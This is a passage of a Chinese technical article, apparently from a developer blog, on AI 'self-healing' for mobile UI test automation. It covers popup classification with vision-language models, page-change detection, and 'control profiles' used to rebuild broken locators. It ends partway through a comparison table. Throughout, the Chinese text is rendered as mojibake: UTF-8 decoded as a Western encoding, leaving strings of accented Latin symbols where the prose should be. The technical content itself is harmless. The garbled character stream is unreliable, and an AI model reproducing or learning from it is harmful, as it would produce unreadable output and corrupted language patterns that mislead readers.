<p>å½“æµ‹è¯•ä»»åŠ¡å¼‚å¸¸ä¸­æ–­æ—¶ï¼ŒAIè‡ªæ„ˆä¼šæ‰§è¡Œäº”æ­¥åˆ†å±‚è¯Šæ–­æµç¨‹ï¼šé¦–å…ˆæ£€æµ‹è®¾å¤‡å¥åº·çŠ¶æ€ï¼ˆå†…å­˜/ç£ç›˜/ç½‘ç»œ/ç‰©ç†è¿æ¥ï¼‰ï¼Œå…¶æ¬¡éªŒè¯è‡ªåŠ¨åŒ–æ¡†æ¶å¯ç”¨æ€§ï¼ˆä¼šè¯çŠ¶æ€ä¸é©±åŠ¨æœåŠ¡ï¼‰ï¼Œç¬¬ä¸‰æ­¥é€šè¿‡AIå¤§æ¨¡å‹èåˆå¼¹çª—çŸ¥è¯†åº“è¯†åˆ«å¹²æ‰°å¼¹çª—ç±»å‹æ™ºèƒ½å¤„ç†ï¼Œç¬¬å››æ­¥åˆ©ç”¨è§†è§‰è¯­è¨€æ¨¡å‹ï¼ˆVLMï¼‰åˆ†æé¡µé¢åŠ è½½çŠ¶æ€ä¸å†…å®¹å®Œæ•´æ€§ï¼Œæœ€ååŸºäºæ§ä»¶ç”»åƒä¸å†å²åŸºçº¿è¿›è¡Œå¤šæ¨¡æ€å¤§æ¨¡å‹æ¯”å¯¹ï¼Œç²¾å‡†æ„ŸçŸ¥å…ƒç´ å˜æ›´ã€‚AIè‡ªæ„ˆé‡‡ç”¨é€’è¿›å¼å†³ç­–æœºåˆ¶ï¼Œæ¯æ­¥è¾“å‡ºç»“æ„åŒ–ä¿®å¤æŒ‡ä»¤ï¼ˆå¦‚â€œå¼¹çª—ä¸­æ–­â†’å®‰å…¨å…³é—­â€ã€â€œå…ƒç´ å˜æ›´â†’åŠ¨æ€é‡æ„å®šä½å™¨â€ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2729240d4493417990f2ac3df35c84c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=%2Bq0KhQ0sgkhslgiSz%2F45nZif4rc%3D" alt="image.png" loading="lazy"/></p>
<p>äº”æ­¥è¯Šæ–­æµç¨‹ç”±è‡ªæ„ˆå¼•æ“æœåŠ¡æ¥é©±åŠ¨ï¼Œå„å±‚çº§è¯Šæ–­ç»“æœä¼šè¾“å‡ºç»“æ„åŒ–çš„å¯æ‰§è¡Œä¿®å¤æŒ‡ä»¤ã€‚è‡ªæ„ˆå¼•æ“æœåŠ¡æ—¶åºå›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71c2cfc3a061430b89abb0a761429b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=CqXielYIWJ4W8gkcFdAx4OOQyWQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">4.2 å¼¹çª—æ™ºèƒ½å¤„ç†å¼•æ“</h3>
<h4 data-id="heading-6">4.2.1 è·¨å¹³å°å¼¹çª—ç¢ç‰‡åŒ–æŒ‘æˆ˜</h4>
<p>è·¨å¹³å°å¼¹çª—ç¢ç‰‡åŒ–æŒ‘æˆ˜ï¼šåœ¨Android/iOS/HarmonyOSå¤šå¹³å°ã€OPPO/vivo/å°ç±³ç­‰å“ç‰ŒåŠMIUI/ColorOSç­‰å®šåˆ¶ç³»ç»Ÿç¯å¢ƒä¸‹ï¼ŒåŒç±»å¼¹çª—ï¼ˆå¦‚ä½ç½®æƒé™ç”³è¯·ï¼‰å‘ˆç°é«˜åº¦å·®å¼‚åŒ–çš„UIè¡¨ç°ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œä»…ä½ç½®æƒé™å¼¹çª—åœ¨ä¸åŒè®¾å¤‡ä¸Šçš„æŒ‰é’®å¸ƒå±€ã€æ–‡æ¡ˆè¡¨è¿°åŠäº¤äº’æ¨¡å¼å‡å­˜åœ¨æ˜¾è‘—å·®å¼‚ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ebb93567d9f4aa6beea60276742658e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=4W2%2BwNLi5Tv3IkKqFIOqRYi0VG4%3D" alt="" loading="lazy"/></p>
<p>Androidæ–¹é¢ï¼Œä¼ ç»Ÿæ–¹æ¡ˆï¼ˆå¦‚åŸºäº<code>DeviceOwner</code>æƒé™è‡ªåŠ¨æˆæƒï¼‰ä»…èƒ½è¦†ç›–éƒ¨åˆ†åœºæ™¯ï¼Œå¯¹å‚å•†æ·±åº¦å®šåˆ¶çš„Romï¼ˆéšç§åˆè§„ã€ç³»ç»Ÿé€šçŸ¥ç±»ï¼ŒOPPOç³»å¼¹çª—ï¼‰ä»å­˜åœ¨é€‚é…ç›²åŒºï¼ŒiOSå’ŒHarmonyæ–¹é¢åˆ™ç¼ºå°‘è‡ªåŠ¨æˆæƒæ¨¡å¼ã€‚æ‰€ä»¥è¿˜æœ‰éƒ¨åˆ†æ–¹æ¡ˆè¿˜æ˜¯é€šè¿‡è§„åˆ™æ¥åŒ¹é…ï¼Œä½†æ˜¯æ— è®ºæˆ‘ä»¬åŠ å¤šå°‘å±‚åŒ¹é…ï¼Œä¸‹æ¬¡æ‰§è¡Œçš„æ—¶å€™è¿˜æ˜¯ä¼šå‡ºç°æ–°çš„é—®é¢˜ã€‚</p>
<h4 data-id="heading-7">4.2.2 ç»“æ„åŒ–å¼¹çª—ç‰¹å¾å»ºæ¨¡</h4>
<p>æˆ‘ä»¬çš„è§£æ³•ä¸å†ç©·ä¸¾æ¨¡å¼ï¼Œè€Œæ˜¯æ„å»ºç‰¹å¾å¼¹çª—è®¤çŸ¥ä½“ç³»ï¼šVLå¤§æ¨¡å‹ä»è§†è§‰å¸ƒå±€ã€è¯­ä¹‰å…³é”®è¯ç»´åº¦æŠ½è±¡å¼¹çª—æœ¬è´¨ç‰¹å¾ï¼Œå¯¹å¼¹çª—è¿›è¡Œå¤šç»´åº¦ã€è¯­ä¹‰åŒ–çš„å½’ç±»å»ºæ¨¡ï¼ˆå¦‚æŒ‰æƒé™ã€ç³»ç»Ÿé€šçŸ¥ç­‰ç±»å‹ï¼‰ï¼Œå°†å…¶æ³›åŒ–ä¸ºå¯ç†è§£çš„ç»“æ„åŒ–çŸ¥è¯†ï¼Œæœ€åè¾“å…¥ç»™å¤§æ¨¡å‹åˆ†æå¹¶æ¨ç†å¼¹çª—å’Œå†³ç­–å¤„ç†ã€‚</p>
<p>è¿™é‡Œåˆ—ä¸¾ä¸€ä¸‹å¸¸è§çš„å¼¹çª—ç±»å‹ï¼š</p>
<ol>
<li>æƒé™ç”³è¯·ç±»ï¼šä½ç½®ã€å­˜å‚¨ã€é€šçŸ¥ã€ç”µè¯ã€çŸ­ä¿¡ç­‰ï¼›</li>
<li>ç³»ç»Ÿé€šçŸ¥ç±»ï¼šç³»ç»Ÿæ›´æ–°ã€ç”µé‡è­¦å‘Šã€ç³»ç»Ÿæ¨é€ã€å­˜å‚¨ä¸è¶³ç­‰ï¼›</li>
<li>éšç§åˆè§„ç±»ï¼šæ•°æ®æ”¶é›†ã€éšç§åˆè§„ç­‰ï¼›</li>
<li>å‚å•†å®šåˆ¶ç±»ï¼šä¼˜åŒ–å»ºè®®ã€è‡ªå¯åŠ¨ã€çœç”µæ¨¡å¼æ¿€æ´»ç­‰ç­‰ã€‚</li>
</ol>
<p>æš‚æ—¶æ— æ³•åœ¨é£ä¹¦æ–‡æ¡£å¤–å±•ç¤ºæ­¤å†…å®¹</p>
<p>ä¸å…ˆå‰æ¢ç´¢çš„ä¼ ç»Ÿæ–¹å¼æ¯”è¾ƒï¼Œä»â€œæœºæ¢°åŒ¹é…â€å‡çº§ä¸ºâ€œæ™ºèƒ½è®¤çŸ¥â€å¤„ç†ï¼Œä¼˜åŠ¿å¦‚ä¸‹ï¼š</p>









































<table><thead><tr><th>ç»´åº¦</th><th>æšä¸¾æ³•</th><th>AIæ™ºèƒ½å¤„ç†</th><th>AIä¼˜åŠ¿</th></tr></thead><tbody><tr><td>å¤„ç†é€»è¾‘</td><td>åŸºäºå›ºå®šè§„åˆ™åŒ¹é…</td><td>åŸºäºè¯­ä¹‰ç†è§£ä¸ç‰¹å¾æ³›åŒ–</td><td>èƒ½å¤„ç†æœªè§è¿‡çš„å¼¹çª—å˜ä½“</td></tr><tr><td>å†³ç­–ç²¾åº¦</td><td>æ˜“å—UIå˜åŠ¨å½±å“</td><td>å·®å¼‚åŒ–å¤„ç†ï¼šåŒæ„ã€ç¡®è®¤ã€å¥½çš„...</td><td>å…·å¤‡é²æ£’æ€§ï¼Œå¯ä»¥åŠ¨æ€è‡ªé€‚åº”</td></tr><tr><td>å¤ç”¨ä»·å€¼</td><td>è„šæœ¬å†…åµŒï¼Œéš¾å…±äº«</td><td>å¹³å°é€šç”¨èƒ½åŠ›</td><td>ç‹¬ç«‹çš„æ•°æ®èµ„äº§</td></tr><tr><td>ç»´æŠ¤æˆæœ¬</td><td>éœ€äººå·¥æ·»åŠ è§„åˆ™ï¼Œçº¿æ€§å¢åŠ </td><td>ç‰¹å¾åº“è½»é‡è¾ƒå‡†ï¼Œå¾®è°ƒå³å¯</td><td>ç»´æŠ¤æˆæœ¬ä½</td></tr><tr><td>æ¼”è¿›èƒ½åŠ›</td><td>é™æ€å›ºåŒ–</td><td>åŠ¨æ€å­¦ä¹ </td><td>å…·å¤‡çŸ¥è¯†å­¦ä¹ èƒ½åŠ›</td></tr></tbody></table>
<h3 data-id="heading-8">4.3 é¡µé¢å˜åŒ–æ™ºèƒ½æ„ŸçŸ¥å¼•æ“</h3>
<p>ç»“åˆæˆ‘ä»¬çš„å†å²æ•°æ®æ•´ç†åˆ†æï¼Œå¸¸è§çš„UIå˜æ›´åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p><strong>æ–‡æ¡ˆè°ƒæ•´ç±»</strong></p>
<p>äº§å“ä¸ºä¼˜åŒ–ç”¨æˆ·æç¤ºä½“éªŒï¼Œä¾‹å¦‚ï¼Œå°†æ–‡æ¡ˆä» â€œç¡®å®šåŠ ä»·5å…ƒå—?â€ è°ƒæ•´ä¸º â€œæ‚¨ç¡®å®šåŠ ä»· 5å…ƒå—?â€ã€‚ä»æ–‡æœ¬å˜æ›´è§’åº¦çœ‹ï¼ŒåŒ…å«ä¸¤å¤„ç»†å¾®ä½†å…¸å‹çš„è°ƒæ•´ï¼š</p>
<ul>
<li>å¥é¦–æ–°å¢æ•¬è¯­â€œæ‚¨â€ï¼Œæå‡è¯­æ°”å‹å¥½åº¦ï¼›</li>
<li>â€œ5å…ƒâ€å‰æ’å…¥ç©ºæ ¼ï¼›</li>
</ul>
</li>
<li>
<p><strong>IDé‡æ„ç±»</strong></p>
<p>IDçš„é‡æ–°å‘½åå’Œå‡ºäºå®‰å…¨ã€æ··æ·†æˆ–å·¥ç¨‹è§„èŒƒè€ƒè™‘ï¼Œæ§ä»¶ ID çš„åŠ¨æ€åŒ–ä¹Ÿæ—¥ç›Šæ™®éã€‚å¼€å‘å›¢é˜Ÿå¸¸å°†é™æ€ IDï¼ˆå¦‚ <code>btn_confirm</code>ï¼‰æ›¿æ¢ä¸ºè¿è¡Œæ—¶ç”Ÿæˆçš„åŠ¨æ€ IDï¼ˆå¦‚ <code>btn_confirm_a6p6a8</code> æˆ–å®Œå…¨ç§»é™¤ IDï¼‰ï¼Œå¯¼è‡´ä¼ ç»ŸåŸºäº <code>resource-id</code> æˆ– <code>accessibility-id</code> çš„å®šä½ç­–ç•¥å½»åº•å¤±æ•ˆã€‚</p>
</li>
<li>
<p><strong>å¸ƒå±€é‡æ„ç±»</strong></p>
<p>ä¸ºæå‡ UI æ¸²æŸ“æ€§èƒ½ï¼Œå¼€å‘å›¢é˜Ÿå¸¸å¯¹æ§ä»¶å¸ƒå±€ä¸å±‚çº§ç»“æ„è¿›è¡Œä¼˜åŒ–ï¼ˆå¦‚å‡å°‘åµŒå¥—å±‚çº§ã€æ›¿æ¢å®¹å™¨ç±»å‹ç­‰ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ç±»ç»“æ„æ€§è°ƒæ•´å¾€å¾€å¯¼è‡´é«˜åº¦ä¾èµ– DOM è·¯å¾„çš„ XPath å®šä½å™¨é›†ä½“å¤±æ•ˆã€‚</p>
</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥å½’çº³é¡µé¢çš„å˜åŒ–åŒ…æ‹¬æ–‡æœ¬ï¼ˆTextï¼‰å’Œå…ƒç´ ï¼ˆElementï¼‰è°ƒæ•´ï¼Œé’ˆå¯¹äºè¿™äº›UIçš„è°ƒæ•´ï¼Œä¼ ç»Ÿçš„UIè‡ªåŠ¨åŒ–å¹¶ä¸èƒ½è‡ªé€‚åº”ï¼Œæ­¤æ—¶ï¼Œéœ€å¼•å…¥é¡µé¢å˜åŒ–æ„ŸçŸ¥èƒ½åŠ›ï¼šåŸºäºå¤šæ¨¡æ€åŸºçº¿ï¼ˆæˆªå›¾ã€OCRã€DOMï¼‰ä¸æ§ä»¶ç”»åƒï¼ˆç±»å‹ã€å±‚çº§ã€ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯¹ UI å˜æ›´è¿›è¡Œç»“æ„åŒ–æ¯”å¯¹ï¼Œå‡†ç¡®è¯†åˆ«å˜æ›´æ€§è´¨ï¼Œä»è€Œåœ¨Textã€IDã€ XPath ç­‰å®šä½å™¨å¤±æ•ˆæ—¶ï¼Œç²¾å‡†è§¦å‘è‡ªæ„ˆä¿®å¤ï¼Œé¿å…æ— æ•ˆé‡è¯•ã€‚å¯¹æ¯”æ–¹æ¡ˆå›¾å‚è€ƒï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2d67c4ed0a5462ea536a6e881c82112~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=7H1PFJF22brI2Wx2QsSHsK5kdkg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">4.3.1 èµ‹äºˆæ§ä»¶â€œæ•°å­—èº«ä»½è¯â€</h4>
<p>åœ¨å®è·µè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°ï¼Œç”±ç¯å¢ƒå™ªéŸ³ç­‰éUIå˜æ›´å› ç´ å¯¼è‡´çš„ä¸´æ—¶æ€§å¤±è´¥ï¼Œæµ‹è¯•ä¸­æ–­å AI è‡ªæ„ˆæ³›åŒ–åä¼šè¯¯åˆ¤ï¼Œåšäº†ä¸€äº›æ— æ•ˆé‡è¯•ï¼Œæ—¢å¢åŠ äº†æµ‹è¯•æ—¶é•¿å½±å“æ•ˆç‡ï¼Œä¹Ÿæ‹‰ä½äº†æ•´ä½“è‡ªæ„ˆæˆåŠŸç‡ã€‚ä¸ºè§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬å¼•å…¥æ§ä»¶ç”»åƒæœºåˆ¶ã€‚æ§ä»¶ç”»åƒæ˜¯å¯¹ UI ç•Œé¢ä¸­ä»»ä¸€äº¤äº’å…ƒç´ ï¼ˆå¦‚æ–‡æœ¬ã€æŒ‰é’®ã€è¾“å…¥æ¡†ç­‰ï¼‰è¿›è¡Œçš„å¤šç»´åº¦ã€ç»“æ„åŒ–ç‰¹å¾åˆ»ç”»ï¼ŒåŒ…å«å…¶å†…åœ¨å±æ€§ï¼ˆç±»å‹ï¼‰ã€ç»“æ„å…³ç³»ï¼ˆå±‚çº§ï¼‰ä¸ç¯å¢ƒä¸Šä¸‹æ–‡ï¼ˆå‘¨å›´ï¼‰ï¼Œå½¢æˆè¯¥æ§ä»¶çš„â€œæ•°å­—èº«ä»½â€ï¼Œåœ¨åŸºçº¿é‡‡é›†é˜¶æ®µï¼Œæˆ‘ä»¬ä¸ºç”¨ä¾‹çš„å…³é”®æ“ä½œæ­¥éª¤ç”Ÿæˆå¯¹åº”çš„æ§ä»¶ç”»åƒï¼Œä½œä¸ºåç»­å˜æ›´æ„ŸçŸ¥ä¸æ™ºèƒ½ä¿®å¤çš„æ ¸å¿ƒä¾æ®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe234dc79bef415ab66550f249aa7858~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=1MPTECR2zD6gCmsUKVG0eKbncbw%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ§ä»¶ç±»å‹</strong>ï¼šæè¿°æ§ä»¶çš„åŠŸèƒ½ç±»åˆ«å’Œè§†è§‰è¡¨ç°ï¼Œå¯ä»¥ä»æ§ä»¶çš„ç±»åï¼ˆidã€Classï¼‰ã€åŠŸèƒ½ç±»å‹ï¼ˆè¯­ä¹‰è§’è‰²ï¼‰ã€æ–‡æœ¬å†…å®¹ã€è§†è§‰ç‰¹å¾ã€äº¤äº’çš„å±æ€§ç­‰ç»´åº¦æè¿°ï¼Œç›®çš„æ˜¯ä¸ºäº†è¯†åˆ«â€œè¿™æ˜¯ä¸€ä¸ª<strong>æ©™è‰²çš„ç¡®è®¤æŒ‰é’®</strong>â€ï¼Œè€Œéç®€å•çš„â€œä¸€ä¸ªidä¸ºbtn_confirmâ€çš„å…ƒç´ ã€‚</p>
<p><strong>å…³ç³»ä¸Šä¸‹æ–‡ï¼š</strong> æè¿°æ§ä»¶æ‰€å¤„çš„é¡µé¢è¯­ä¹‰ä¸äº¤äº’ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥é¡µé¢å…¨æ–‡ç†è§£ã€ä¸šåŠ¡ä¸Šä¸‹æ–‡ç­‰æ–¹é¢æè¿°ï¼Œç†è§£â€œè¿™æ˜¯<strong>éšç§æ”¿ç­–åè®®åº•éƒ¨çš„åŒæ„æŒ‰é’®</strong>â€ï¼Œè€Œéä»»æ„â€œåŒæ„â€æ–‡æœ¬ã€‚</p>
<p><strong>ç»“æ„å…³ç³»</strong>ï¼šæè¿°æ§ä»¶åœ¨ UI æ ‘ä¸­çš„ç»“æ„ä½ç½®ä¸çˆ¶å­å…³ç³»ï¼Œå¯ä»¥ä»DOMè·¯å¾„ã€æ·±åº¦å±‚çº§ã€çˆ¶å®¹å™¨ã€å…„å¼ŸèŠ‚ç‚¹ã€å­èŠ‚ç‚¹ç­‰ç»´åº¦æè¿°ï¼Œç›®çš„æ˜¯ä¸ºäº†æŠ—å¸ƒå±€å¾®è°ƒã€‚</p>
<p>æ§ä»¶ç”»åƒç›¸è¾ƒäºä¼ ç»Ÿå®šä½å™¨ä»…ä¾èµ–å•ä¸€å±æ€§ï¼Œæ§ä»¶ç”»åƒé€šè¿‡å¤šç»´åº¦ç‰¹å¾èåˆï¼ˆç±»å‹ã€å±‚çº§ã€ä¸Šä¸‹æ–‡ï¼‰ï¼Œæ˜¾è‘—æå‡äº†æ§ä»¶è¯†åˆ«çš„é²æ£’æ€§ä¸å¯è§£é‡Šæ€§ã€‚æ›´ä¸ºé‡è¦çš„æ˜¯ï¼Œåœ¨åŸºäºå¤§æ¨¡å‹çš„åŸºçº¿æ¯”å¯¹æµç¨‹ä¸­ï¼Œæ§ä»¶ç”»åƒä½œä¸ºç»“æ„åŒ–å…ˆéªŒçŸ¥è¯†ï¼Œå¯ä»¥æœ‰æ•ˆçº¦æŸå¤§æ¨¡å‹è¾“å‡ºï¼Œå‡å°‘å…¶å› è¿‡åº¦æ³›åŒ–è€Œäº§ç”Ÿè¯¯åˆ¤ï¼Œæ˜¯å®ç°â€œæ™ºèƒ½ä½†ä¸å¤±æ§â€çš„å…³é”®æœºåˆ¶ã€‚
å¦‚å›¾æ‰€ç¤ºï¼Œå¤§æ¨¡å‹åœ¨å¼•å…¥æ§ä»¶ç”»åƒåçš„è¯Šæ–­ç»“æœçš„å·®å¼‚ï¼š</p>
<ul>
<li><strong>æœªå¼•å…¥æ§ä»¶ç”»åƒ</strong> <strong>ï¼š</strong> å¤§æ¨¡å‹å°†â€œä¸“ç¥¨(æ’®åˆ)â€æ³›åŒ–æˆç±»ä¼¼è¯­ä¹‰çš„â€œå¼€ç¥¨â€ï¼›</li>
<li><strong>å¼•å…¥æ§ä»¶ç”»åƒ</strong> <strong>ï¼š</strong> å¤§æ¨¡å‹å°†â€œä¸“ç¥¨(æ’®åˆ)â€åˆ¤å®šä¸ºç§»é™¤ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd47cc0050d64073a65c96ae59de661f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=PrLP86zfrDgMnr2sy1c1A1c6Hos%3D" alt="screenshot-20260203-194234.png" loading="lazy"/></p>
<h4 data-id="heading-10">4.3.2 æ–‡æœ¬ã€å…ƒç´ å˜åŒ–è‡ªæ„ˆ</h4>
<p>å¯¹äºé¡µé¢å˜åŒ–æ„ŸçŸ¥å’Œè‡ªæ„ˆå¼•æ“çš„å®ç°ï¼Œå¯ä»¥ç®€å•åˆ†ä¸ºä¸‰é˜¶æ®µæµç¨‹å®ç°å¯¹é¡µé¢å˜åŒ–çš„ç²¾å‡†æ„ŸçŸ¥ä¸æ™ºèƒ½ä¿®å¤èƒ½åŠ›ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6890f21435814e35abe301f83ed7b994~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=6FKNdSFJBgl1yUJI3xJ3EO461eE%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>åŸºçº¿æ„å»ºé˜¶æ®µ</li>
</ul>
<p>åœ¨ç”¨ä¾‹æˆåŠŸæ‰§è¡Œæ—¶ï¼Œæˆ‘ä»¬ä¼šåŒæ­¥é‡‡é›†ä¸‰ç±»æ•°æ®ï¼š é€šè¿‡ adb (Android)ã€tidevice (iOS)ã€hdc (HarmonyOS) è·å–è®¾å¤‡æˆªå›¾å¿«ç…§ï¼ŒPaddleOCR æå–é¡µé¢æ–‡æœ¬å†…å®¹ï¼Œ Appiumã€hdc è·å–å½“å‰æ§ä»¶æ ‘ç»“æ„ã€‚å°†è¿™äº›å¤šæ¨¡æ€æ•°æ®èåˆåï¼ŒåŒæ—¶ç”Ÿæˆç›®æ ‡æ§ä»¶çš„ç»“æ„åŒ–æè¿°ï¼ˆå³æ§ä»¶ç”»åƒï¼‰ã€‚ä¸ºé™ä½å¤§æ¨¡å‹æ¨ç†è€—æ—¶ä¸ tokensæ¶ˆè€—ï¼Œæˆ‘ä»¬åœ¨é‡‡é›†è¿‡ç¨‹ä¸­ä¼šå¯¹æˆªå›¾è¿›è¡Œå‹ç¼©å’Œéå…³é”®åŒºåŸŸï¼ˆçŠ¶æ€æ ã€å¯¼èˆªæ ï¼‰å‰ªåˆ‡ï¼Œå¹¶å¯¹æ§ä»¶æ ‘è¿›è¡Œå†—ä½™èŠ‚ç‚¹æ¸…æ´—ã€‚</p>
<ul>
<li>
<p><strong>å˜åŒ–æ„ŸçŸ¥é˜¶æ®µ</strong></p>
<ul>
<li>
<p>æµ‹è¯•ä¸­æ–­æ—¶ï¼Œç›¸å…³è‡ªæ„ˆå¼•æ“å¯åŠ¨ï¼š</p>
<ul>
<li>æ–‡æ¡ˆå¼•æ“ï¼šç»“åˆæ§ä»¶ç”»åƒå’ŒåŸºçº¿ï¼Œé€šè¿‡VLå¤§æ¨¡å‹è¿›è¡Œè¯­ä¹‰ã€åŠŸèƒ½ã€ç»“æ„åˆ†æå‡ºæœŸæœ›æ–‡æœ¬ã€‚</li>
<li>å…ƒç´ å¼•æ“ï¼šç»“åˆæ§ä»¶ç”»åƒå’ŒåŸºçº¿ï¼Œé€šè¿‡å¤§æ¨¡å‹å¯¹å½“å‰DOM è®¤çŸ¥ï¼Œåˆ†æå‡ºæœŸæœ›å…ƒç´ ã€‚</li>
</ul>
</li>
<li>
<p>å¤šç»´åº¦åŒ¹é…ï¼Œä»ä¸‰ä¸ªå±‚é¢éªŒè¯æ§ä»¶ä¸€è‡´æ€§ï¼š</p>
<ul>
<li>è¯­ä¹‰å±‚é¢ï¼šè¯­ä¹‰ç›¸ä¼¼åº¦åˆ†ææ ¸å¿ƒæ„å›¾ï¼Œåˆ¤æ–­â€œæ‚¨ç¡®å®šåŠ ä»· 5å…ƒå—?â€ä¸â€œç¡®å®šåŠ ä»·5å…ƒå—?â€æ˜¯å¦åŠŸèƒ½ç­‰ä»·ï¼›</li>
<li>ä½ç½®å±‚é¢ï¼šéªŒè¯æ§ä»¶æ‹“æ‰‘å…³ç³»ï¼Œé€šè¿‡è§†è§‰è¾¹ç•Œå’Œç›¸é‚»èŠ‚ç‚¹åŒ¹é…ï¼Œç¡®è®¤æ§ä»¶ä½ç½®å˜åŒ–æ˜¯å¦å’ŒåŠŸèƒ½åŒ¹é…ï¼›</li>
<li>ç»“æ„å±‚é¢ï¼šåˆ†æ DOM æ ‘å˜åŒ–æ¯”å¯¹å…³é”®è·¯å¾„ï¼Œè¯†åˆ«å±‚çº§é‡æ„çš„åœºæ™¯ï¼›</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>æ™ºèƒ½ä¿®å¤é˜¶æ®µ</strong></p>
</li>
</ul>
<p>ç»“åˆå¤šç»´åº¦åŒ¹é…å’Œæ¨ç†ç½®ä¿¡åº¦ï¼Œå¯¹æœ‰æ•ˆå˜æ›´è‡ªåŠ¨ç”Ÿæˆä¸¤ç§ä¿®å¤ç­–ç•¥ï¼šé€‰æ‹©å™¨ä¼˜åŒ–ï¼ˆè°ƒæ•´ç°æœ‰å®šä½æ¡ä»¶ï¼‰ä¸é€‰æ‹©å™¨é‡æ„ï¼ˆç”Ÿæˆå…¨æ–°å®šä½ï¼‰ã€‚</p>
<ul>
<li>å˜æ›´ç±»å‹è¾“å‡ºï¼šæ–‡æ¡ˆä¼˜åŒ–ã€å…ƒç´ é‡æ„ã€å¸ƒå±€è°ƒæ•´ï¼›</li>
<li>å®šä½å™¨è¾“å‡ºï¼šé€‰æ‹©å™¨é‡æ„ã€å¥å£®æ€§ä¼˜å…ˆçš„å®šä½å™¨ï¼›</li>
<li>æ­¥éª¤çº§åˆ«é‡è¯•ï¼šç²¾å‡†å®šå‘ä¿®å¤ï¼Œä¿ç•™ä¸šåŠ¡æ•°æ®çŠ¶æ€ï¼Œé¿å…é‡å¤ä¹‹å‰çš„æ­¥éª¤ã€‚</li>
</ul>
<p>é¡µé¢å˜åŒ–æ™ºèƒ½æ„ŸçŸ¥ç›¸è¾ƒäºä¼ ç»ŸUIè‡ªåŠ¨åŒ–æ‰§è¡Œæ¨¡å¼å¯¹æ¯”ï¼š</p>



































<table><thead><tr><th><strong>ç»´åº¦</strong></th><th><strong>ä¼ ç»ŸUIè‡ªåŠ¨åŒ–</strong></th><th><strong>é¡µé¢å˜åŒ–æ™ºèƒ½æ„ŸçŸ¥</strong></th><th><strong>AIå…³é”®èƒ½åŠ›å·®å¼‚</strong></th></tr></thead><tbody><tr><td>é—®é¢˜åº”å¯¹æœºåˆ¶</td><td>è„šæœ¬å¤±æ•ˆå³å¤±è´¥ï¼Œä¾èµ–äººå·¥ä¿®å¤</td><td>è‡ªåŠ¨ä»‹å…¥</td><td>AIè‡ªåŠ¨ç”Ÿæˆæ–°å®šä½å™¨å¹¶åŠ¨æ€æ›¿æ¢æ‰§è¡Œ</td></tr><tr><td>ç»´æŠ¤æˆæœ¬</td><td>æ¯æ¬¡UIå˜æ›´éœ€äººå·¥æ›´æ–°å®šä½å™¨</td><td>æ— éœ€äººå·¥ä»‹å…¥</td><td>é™ä½ç»´æŠ¤æˆæœ¬</td></tr><tr><td>è‡ªé€‚åº”èƒ½åŠ›</td><td>ä»…æ”¯æŒé¢„å®šä¹‰åœºæ™¯ï¼Œæ— æ³•å¤„ç†æœªçŸ¥å˜æ›´</td><td>AIè‡ªåŠ¨æ•è·å…ƒç´ ã€æ–‡æœ¬ã€å¸ƒå±€å˜åŒ–</td><td>å¤šæ¨¡æ€æ¯”å¯¹ + 